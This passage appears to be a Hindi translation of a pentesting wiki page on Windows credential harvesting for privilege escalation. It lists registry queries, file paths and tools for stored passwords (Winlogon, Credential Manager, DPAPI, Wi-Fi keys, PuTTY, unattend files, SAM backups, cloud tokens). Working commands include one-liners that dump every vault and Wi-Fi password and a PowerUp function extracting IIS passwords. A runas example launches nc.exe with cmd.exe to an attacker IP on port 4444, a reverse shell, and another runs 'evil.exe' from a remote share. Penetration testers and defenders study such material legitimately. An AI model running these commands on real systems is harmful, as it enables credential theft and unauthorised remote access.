WSL के अंदर Linux `root` होने से अपने-आप Windows Administrator अधिकार नहीं मिलते। यदि वर्तमान Windows identity किसी distribution के फ़ाइल सिस्टम को पढ़ सकती है, तो shell-history फ़ाइलों (जिसमें `/root/.bash_history` भी शामिल है) में ऐसे commands देखें जिनमें credentials दर्ज हुए हों; privilege escalation के लिए अब भी उच्च-विशेषाधिकार वाले वैध account और अनुमत authentication path की आवश्यकता होती है। `LocalState\rootfs` लेआउट पुराने WSL installations पर लागू होता है; WSL 2 में आम तौर पर distribution एक [`ext4.vhdx` virtual disk](https://learn.microsoft.com/en-us/windows/wsl/disk-space) में संग्रहीत होती है, इसलिए पहले वास्तविक distribution और storage path की पहचान करें। Automated enumeration के दौरान history की सामग्री दिखाने से बचें।

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` और `DefaultDomainName` को credentials नहीं, बल्कि account context मानें। गैर-रिक्त `DefaultPassword` या `AltDefaultPassword` मान plaintext registry finding है। अगर `AutoAdminLogon=1` है, लेकिन कोई plaintext password पढ़ा नहीं जा सकता, तो यह केवल एक lead है: [Sysinternals Autologon can store the password as an LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), और सामान्य registry reads से यह स्थापित नहीं होता कि वह secret मौजूद है या उसे retrieve किया जा सकता है। Credential exposure की रिपोर्ट करने से पहले access rights और वास्तविक logon configuration की समीक्षा करें।

### Credentials manager / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> से\
Windows Vault, servers, websites और अन्य programs के लिए user credentials संग्रहित करता है, जिनका उपयोग **Windows** **users को अपने-आप log in करने** के लिए कर सकता है। पहले सुनने में ऐसा लग सकता है कि users Facebook, Twitter या Gmail जैसी sites के credentials संग्रहित कर सकते हैं और browsers को अपने-आप log in करवा सकते हैं, लेकिन यह इस तरह काम नहीं करता।

Windows Vault वे credentials संग्रहित करता है जिनका उपयोग Windows users को अपने-आप log in करने के लिए कर सकता है। इसका मतलब है कि कोई भी **Windows application जिसे किसी resource** (server या website) **तक पहुँचने के लिए credentials की ज़रूरत हो**, इस Credential Manager और Windows Vault का उपयोग कर सकता है और users को हर बार username और password दर्ज करने के बजाय दिए गए credentials इस्तेमाल कर सकता है।

जब तक applications, Credential Manager के साथ interact नहीं करते, मुझे नहीं लगता कि वे किसी दिए गए resource के लिए credentials इस्तेमाल कर सकते हैं। इसलिए, अगर आपका application vault का उपयोग करना चाहता है, तो उसे किसी तरह **credential manager से communicate करना चाहिए और default storage vault से उस resource के credentials माँगने चाहिए**।

मशीन पर संग्रहित credentials की सूची देखने के लिए `cmdkey` का उपयोग करें।

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

फिर आप सहेजे गए credentials का उपयोग करने के लिए `/savecred` विकल्प के साथ `runas` इस्तेमाल कर सकते हैं। निम्नलिखित उदाहरण SMB share के ज़रिए किसी remote binary को कॉल करता है।

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

दिए गए क्रेडेंशियल्स के साथ `runas` का उपयोग करना।

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) का उपयोग किया जा सकता है।

### UWP PasswordVault / Credential Locker

आधुनिक Windows UWP applications, Microsoft Edge और आधुनिक system services authentication tokens तथा plaintext passwords को Universal Windows Platform (UWP) `PasswordVault` में संग्रहित करते हैं (जिसे `vaultcmd` में `Web Credentials` के रूप में भी दिखाया जाता है)। यह storage space session-isolated है और इसे administrative या `SeDebugPrivilege` अधिकारों के बिना native तरीके से decrypt किया जा सकता है।

संग्रहित सभी usernames और plaintext passwords को तुरंत dump और decrypt करने के लिए, उपयोगकर्ता के सक्रिय session में यह PowerShell command चलाएँ:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** डेटा के symmetric encryption की एक विधि प्रदान करता है, जिसका उपयोग मुख्यतः Windows operating system में asymmetric private keys के symmetric encryption के लिए किया जाता है। यह encryption entropy में महत्वपूर्ण योगदान देने के लिए user या system secret का उपयोग करता है।

**DPAPI, user के login secrets से निकली symmetric key के ज़रिए keys को encrypt करने की सुविधा देता है**। System encryption के मामलों में, यह system के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके encrypted user RSA keys `%APPDATA%\Microsoft\Protect\{SID}` directory में संग्रहीत होती हैं, जहाँ `{SID}` user के [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) को दर्शाता है। **DPAPI key, जो उसी file में user की private keys को सुरक्षित रखने वाली master key के साथ मौजूद होती है**, आमतौर पर 64 bytes के random data से बनी होती है। (ध्यान दें कि इस directory तक पहुँच प्रतिबंधित है, इसलिए CMD में `dir` command से इसकी सामग्री की सूची नहीं देखी जा सकती, हालाँकि PowerShell के ज़रिए इसे सूचीबद्ध किया जा सकता है।)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

आप इसे decrypt करने के लिए उचित arguments (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग कर सकते हैं।

**master password** से सुरक्षित **credentials files** आमतौर पर यहाँ स्थित होती हैं:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

आप उचित `/masterkey` के साथ decrypt करने के लिए **mimikatz module** `dpapi::cred` का उपयोग कर सकते हैं।\
यदि आपके पास root access है, तो `sekurlsa::dpapi` module से **memory** से कई **DPAPI** **masterkeys** **extract** कर सकते हैं।


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** का उपयोग अक्सर **scripting** और automation कार्यों में encrypted credentials को सुविधाजनक ढंग से store करने के लिए किया जाता है। ये credentials **DPAPI** से सुरक्षित होते हैं, जिसका आम तौर पर अर्थ है कि इन्हें केवल उसी user द्वारा उसी computer पर decrypt किया जा सकता है जिस पर इन्हें बनाया गया था।

Export किए गए credential का filename या `.xml` path कुछ भी हो सकता है। जब कोई script या file inventory इसकी ओर संकेत करे, तो `C:\Users` मान लेने के बजाय account की वास्तविक profile directory पता करें: [Windows profiles को कहीं और रख सकता है](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)। File को पढ़ पाना केवल एक सुराग है; [Windows का `Export-Clixml` encrypted credential को export करने वाले user और computer से जोड़ता है](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), और प्राप्त किए गए किसी भी account के पास इच्छित service पर अलग से वैध अधिकार होने चाहिए। नियमित enumeration के दौरान encrypted या plaintext values दिखाए बिना पहले paths और ACLs की जाँच करें।

किसी file में मौजूद PS credentials को **decrypt** करने के लिए आप यह कर सकते हैं:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### वाई-फ़ाई

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### सहेजे गए RDP कनेक्शन

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पा सकते हैं

### हाल ही में चलाए गए कमांड

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** के `dpapi::rdg` module का उपयोग उपयुक्त `/masterkey` के साथ **किसी भी .rdg files को decrypt करने** के लिए करें।\
आप Mimikatz के `sekurlsa::dpapi` module से memory में मौजूद कई DPAPI masterkeys **extract कर सकते हैं**।

**mRemoteNG एक अलग connection store का उपयोग करता है।** `%APPDATA%\mRemoteNG` और user Documents में पढ़े जा सकने वाले XML की जाँच करें, जिनमें `config.xml` जैसे साधारण नाम वाली files भी शामिल हैं। किसी XML file को credential lead मानने से पहले उसका connection schema और encrypted `Password` attributes पहचानें। संग्रहित value DPAPI/RDCMan password नहीं है; इसे recover करना file की encryption settings और custom master password के उपयोग पर निर्भर करता है। व्यापक enumeration के दौरान encrypted values प्रिंट करने से बचें।

**Remote Desktop Plus profile exports** user directories या साझा administration folder में पढ़े जा सकने वाले रूप में भी मौजूद हो सकते हैं। पुराने `profiles.xml` export में `ProfileName`, `Password` और `Secure` elements वाले `Data/Profile` entries होते हैं। किसी nonempty password element को credential lead मानें, लेकिन उसे प्रिंट न करें और न ही plaintext मानें: [vendor के अनुसार](https://www.donkz.nl/), profile protection बनाने वाले account और computer से जुड़ी हो सकती है, या कम सख्ती से configure की जा सकती है। उस पर भरोसा करने से पहले file का origin और recovery conditions की पुष्टि करें।

### Sticky Notes

लोग कभी-कभी sticky-note applications में passwords और अन्य जानकारी सहेजते हैं। Microsoft का packaged Sticky Notes app आम तौर पर notes को `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` में रखता है; पुराने या दूसरे apps user-profile के अन्य stores, जिनमें LevelDB भी शामिल है, का उपयोग कर सकते हैं। SQLite file न मिलने को notes न होने का प्रमाण मानने से पहले installed app और storage format पहचानें।

अगर Sticky Notes SQLite write-ahead logging का उपयोग कर रहा है, तो केवल `plum.sqlite` की copy में हाल ही में commit किए गए notes छूट सकते हैं। Database की एक सुसंगत copy के साथ संबंधित `plum.sqlite-wal` भी रखें और उपलब्ध होने पर `plum.sqlite-shm` भी शामिल करें; shared-memory index को फिर से बनाया जा सकता है, लेकिन WAL database की persistent state का हिस्सा है। [SQLite का WAL documentation](https://www.sqlite.org/wal.html) देखें। Account name या password वाले note को केवल credential lead मानें: account, अनुमत access और password reuse की अलग-अलग पुष्टि करें। किसी encrypted password-manager record से higher-privilege login स्थापित करने से पहले उसकी असली decryption key और application-specific interpretation भी आवश्यक है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से passwords recover करने के लिए आपको Administrator होना और High Integrity level में चलाना आवश्यक है।**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में मौजूद है।\
अगर यह file मौजूद है, तो संभव है कि कुछ **credentials** configure किए गए हों और उन्हें **recover** किया जा सके।

यह code [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) से लिया गया था:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
Installers **SYSTEM privileges के साथ चलाए जाते हैं**, इनमें से कई **DLL Sideloading के प्रति vulnerable हैं (जानकारी:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Files और Registry (Credentials)

### Support-tool registry credential artifacts

कुछ पुराने remote-support installations में fixed application registry keys के अंतर्गत password-संबंधी value names मौजूद रह सकते हैं। उदाहरण के लिए, [vendor की registry-key explanation](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) के अनुसार, TeamViewer का `SecurityPasswordAES` version 9 से पहले configured static session password की पहचान करता था। Value-name marker केवल जाँच का संकेत है: उस credential का आकलन करने से पहले installed version, पढ़े जा सकने वाले value data, format और मौजूदा authentication behavior की पुष्टि करें। Remote-support password से अधिक privileged Windows account तक पहुँचने के लिए उस account में password का वास्तव में reuse होना और उस account के लिए authorization भी आवश्यक है। सामान्य enumeration output में ciphertext और recovered passwords न दिखाएँ।

### Protected sheets वाली shared spreadsheets

यदि संदेह हो कि किसी पढ़ी जा सकने वाली shared workbook में account data है, तो **file encryption** और worksheet protection या hidden columns में अंतर करें। [Microsoft का कहना है](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) कि worksheet protection editing को नियंत्रित करती है और यह security feature नहीं है; इससे अपने-आप यह साबित नहीं होता कि workbook की सामग्री encrypted है। केवल अधिकृत और प्रासंगिक files की समीक्षा करें और व्यापक enumeration के दौरान संभावित secrets प्रिंट करने से बचें। केवल पढ़ा जा सकने वाला `.xlsx` path, protected sheet या hidden column यह साबित नहीं करता कि credentials मौजूद हैं या किसी account के पास अधिक privileges हैं; वास्तविक data और मौजूदा account rights की अलग-अलग पुष्टि करें।

### CI server में रखे गए change patches

Build पूरा होने के बाद भी CI server अपने data directory में submit किए गए source changes रख सकता है। [TeamCity के दस्तावेज़](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) के अनुसार, `system/changes` remote-run changes के लिए storage है; data directory को configure किया जा सकता है और यह ज़रूरी नहीं कि `ProgramData` के अंतर्गत हो। पढ़ा जा सकने वाला patch, credential file, encryption key या इन दोनों का उपयोग करने वाली script के हटाए गए या जोड़े गए references को बनाए रख सकता है। उदाहरण के लिए, PowerShell के `ConvertTo-SecureString -Key` workflow के लिए AES key के साथ encrypted string भी चाहिए; [Microsoft के दस्तावेज़](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) के अनुसार, key अलग से दी जाती है। पहले केवल सुलभ patch names की समीक्षा करें, फिर authorization के अंतर्गत प्रासंगिक सामग्री देखें और सामान्य enumeration output में secrets प्रिंट न करें। केवल patch path, encrypted value या key reference से किसी valid credential या higher-privilege access की पुष्टि नहीं होती। Data-directory ACLs को सीमित रखें और build changes में secrets commit न करें।

### Custom local administrator password rotation

घर में बनाया गया password rotator, encrypted local administrator password को local service में रख सकता है और datastore credentials को पढ़ी जा सकने वाली `.env` file में या updater binary के पास रख सकता है। Updater के scheduled task, account, configuration ACLs, listener और datastore permissions की साथ में समीक्षा करें। केवल loopback पर उपलब्ध datastore भी ऐसे local user की पहुँच में हो सकता है जिसके पास valid credentials हों, लेकिन authentication से यह साबित नहीं होता कि उसे संबंधित records पढ़ने की permission है। यदि encryption seed या key material ciphertext के पास उपलब्ध है, तो encryption पर भरोसा करने से पहले सटीक key derivation की समीक्षा करें। Exposed seed से Go के [`math/rand`](https://pkg.go.dev/math/rand) का उपयोग करके AES key को deterministic रूप से derive करने वाली scheme उस password को सुरक्षित रखने के लिए अनुपयुक्त है; Go के दस्तावेज़ों में इस package को security-sensitive randomness के लिए अनुपयुक्त बताया गया है। किसी recovered password को escalation path मानने से पहले पुष्टि करें कि वह मौजूदा है और local Administrators-group account का है। Scheduled task, `.env` path या encrypted blob अकेले इनमें से किसी भी शर्त को साबित नहीं करते। सामान्य enumeration output में passwords और key material न दिखाएँ।

Managed local administrator passwords के लिए [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) का उपयोग करें। इसका directory या Entra-backed storage और access controls, custom local datastore से अलग हैं; इसी तरह, [Elasticsearch roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) तय करते हैं कि authenticated datastore user कोई खास index पढ़ सकता है या नहीं।

### Java server plugin archives और credential reuse

कुछ Java server plugins, server की `plugins` directory में JAR archives के रूप में वितरित किए जाते हैं। किसी पढ़े जा सकने वाले custom plugin में configuration या bytecode के भीतर embedded service credential हो सकता है। Archive की समीक्षा केवल authorization होने पर करें और recovered secrets को सामान्य enumeration output में न दिखाएँ। केवल plugin path से यह साबित नहीं होता कि कोई secret मौजूद है; और recovered service password से higher privileges तभी मिलते हैं, जब वह किसी अधिक privileged account के लिए भी valid हो। संबंधित file ACLs जाँचें और reused credentials को अलग-अलग secrets से बदलें। Directory layout के लिए [PaperMC की plugin installation guide](https://docs.papermc.io/paper/adding-plugins/) और archive contents के लिए [Oracle का JAR documentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) देखें।

### Openfire embedded database credentials

Embedded database का उपयोग करने वाला Openfire installation, `openfire.script` को `Openfire\embedded-db` के अंतर्गत रख सकता है। यदि मौजूदा account इसे पढ़ सकता है, तो `OFUSER` records और `passwordKey` property की साथ में समीक्षा करें। Openfire के [user-provider documentation](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) के अनुसार, passwords plain text में या उस property में रखी key से encrypted रूप में stored हो सकते हैं। Recovered password से escalation तभी संभव है, जब वह किसी अधिक privileged identity के लिए अब भी valid हो; केवल file name से न तो read access साबित होता है, न credential reuse। इस path को inventory का संकेत मानें और database content तथा credentials को सामान्य enumeration output में न दिखाएँ।

अलग `Openfire\conf\openfire.xml` file, external database का उपयोग होने पर भी, admin console के configured ports और bind interface का पता दे सकती है। Openfire आम तौर पर अपने admin console को loopback पर bind करता है; listener चल रहा हो तो local account फिर भी उस address तक पहुँच सकता है। वास्तविक listener, authorized admin role, plugin-upload policy और Openfire service identity की साथ में जाँच करें। Plugin install कर सकने वाला admin, plugin code को service के context में चला सकता है; यदि service LocalSystem के रूप में चलती है, तो उस context में बहुत अधिक privileges हो सकते हैं। किसी matching account password या पढ़े जा सकने वाले configuration path से अकेले admin-console access या code execution साबित नहीं होता। Vendor की [installation and plugin-management guide](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) और [plugin-upload API property](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) देखें।

### Forensic management server configuration

Velociraptor server configurations, जिनका नाम आम तौर पर `server.config.yaml` होता है, internal CA की `CA.private_key` रख सकती हैं। यदि कम privileged user उस key को पढ़ सकता है, तो वह API client certificate बना सकता है। इससे higher privileges मिलेंगे या नहीं, यह server के user roles, API reachability और server या target agent के चलने की identity पर निर्भर करता है। Client configuration में अलग सामग्री होती है; उसे खोज लेने से server CA तक access साबित नहीं होता। कुछ deployments में CA private key offline रखी जाती है, इसलिए पढ़ी जा सकने वाली server configuration में signing key मौजूद न भी हो सकती है।

Windows server पर, installation directory में मौजूद **server** configuration और किसी भी protected backup copy के ACL की जाँच करें। एक संभावित location `%ProgramFiles%\VelociraptorServer\server.config.yaml` है; यदि service में अलग path configured हो, तो उसी का उपयोग करें। पुष्टि करें कि मौजूदा identity file पढ़ सकती है और `CA.private_key` वास्तव में मौजूद है। Logs या enumeration output में private key प्रिंट न करें। Vendor का `config api_client` workflow client certificate जारी करने के लिए CA key का उपयोग करता है, लेकिन इसके लिए प्रभावी server-side role भी चाहिए; ऐसा role बनाना या बदलना datastore write access या restart माँग सकता है। यदि वे writes उपलब्ध न हों, तब भी कोई मौजूदा privileged server identity रास्ता दे सकती है। Execution rights वाली API queries संबंधित server या agent context में चलती हैं, जहाँ बहुत अधिक privileges हो सकते हैं।

Server configuration और backups को restrictive ACLs से सुरक्षित रखें, जहाँ संभव हो CA signing key को offline रखें, और API roles तथा listener access सीमित करें। [Velociraptor API documentation](https://docs.velociraptor.app/docs/server_automation/server_api/) और [security configuration guidance](https://docs.velociraptor.app/docs/deployment/security/) देखें।

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY एक अलग session manager है। इसका native encrypted store `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` पर हो सकता है, जबकि exported session backup का नाम `sessions-backup.dat` हो सकता है और वह कहीं और stored हो सकता है। [SolarWinds की export guide](https://thwack.solarwinds.com/discussion/comment/115591) के अनुसार, exports password-encrypted होते हैं और उनमें sessions, keys, scripts, tags और relationships हो सकते हैं; इसका [support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) native store की पहचान करता है। पहले file permissions और paths जाँचें। इनमें से कोई file मिलने से उसका password पता नहीं चलता और न ही यह साबित होता है कि कोई saved credential अब भी valid है या उसके पास अधिक privileges हैं।

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Registry में SSH keys

SSH private keys registry key `HKCU\Software\OpenSSH\Agent\Keys` में stored हो सकती हैं, इसलिए देखें कि वहाँ कुछ दिलचस्प है या नहीं:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

यदि आपको उस path के अंदर कोई entry मिलती है, तो संभवतः वह सहेजी गई SSH key होगी। यह encrypted रूप में stored होती है, लेकिन इसे [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके आसानी से decrypt किया जा सकता है।\
इस technique के बारे में अधिक जानकारी यहाँ है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

यदि `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह boot पर अपने आप start हो, तो चलाएँ:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> ऐसा लगता है कि यह technique अब मान्य नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` से जोड़ने और ssh के ज़रिए एक मशीन में login करने की कोशिश की। Registry HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### Unattended फ़ाइलें

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

आप इन files को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM और SYSTEM बैकअप

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

पठनीय Windows Imaging (`.wim`) backup files में offline `SAM`, `SECURITY`, और `SYSTEM` hives भी हो सकते हैं। स्थानीय रूप से उपलब्ध backup या image directories को प्राथमिकता दें और कुछ भी extract करने से पहले image के **member names** की जाँच करें; केवल `.wim` filename से यह साबित नहीं होता कि उसमें hives उपलब्ध हैं, और सामान्य `install.wim`, `boot.wim`, तथा recovery images अक्सर गलत सुराग साबित होते हैं। SMB share एक अलग access path है और उसे केवल तभी जाँचना चाहिए जब वह share दायरे में हो। Microsoft's [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) और [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) देखें।

### Cloud Credentials

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** नाम की फ़ाइल खोजें

### Cached GPP Password

पहले एक ऐसी सुविधा उपलब्ध थी, जो Group Policy Preferences (GPP) के ज़रिए मशीनों के समूह पर custom local administrator accounts deploy करने देती थी। हालाँकि, इस तरीके में सुरक्षा की गंभीर खामियाँ थीं। पहली बात, SYSVOL में XML फ़ाइलों के रूप में संग्रहित Group Policy Objects (GPOs) को कोई भी domain user access कर सकता था। दूसरी बात, इन GPPs में मौजूद passwords AES256 से encrypt किए गए थे, लेकिन encryption के लिए इस्तेमाल की गई default key सार्वजनिक रूप से documented थी, इसलिए कोई भी authenticated user इन्हें decrypt कर सकता था। इससे गंभीर जोखिम पैदा होता था, क्योंकि users elevated privileges हासिल कर सकते थे।

